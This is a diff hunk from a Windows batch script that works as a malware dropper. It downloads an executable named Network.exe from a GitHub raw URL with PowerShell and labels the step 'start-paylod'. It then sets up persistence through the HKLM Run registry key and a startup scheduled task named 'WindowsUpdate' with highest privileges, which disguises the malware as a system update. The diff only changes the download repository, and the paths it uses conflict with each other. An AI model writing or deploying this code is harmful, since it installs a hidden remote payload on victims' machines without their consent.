@@ -22,7 +22,7 @@ cls
 echo --------------------cerete-my-path--------------------------------------------------
 mkdir "%systemdrive%\programdata\34-Win"
 echo ----------------------------copy-my-files-to-web-sever-------------------------------------
-PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/Splash2520/Network/raw/refs/heads/main/Network.exe','%programdata%\34-Win\Network.exe')Add commentMore actions
+PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/Splash2520/splash/raw/refs/heads/main/Network.exe','%programdata%\34-Win\Network.exe')Add commentMore actions
 echo -----------start-paylod------------------------
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\34-Win\Network.exe"
 schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\86-Win\Network.exe" /f
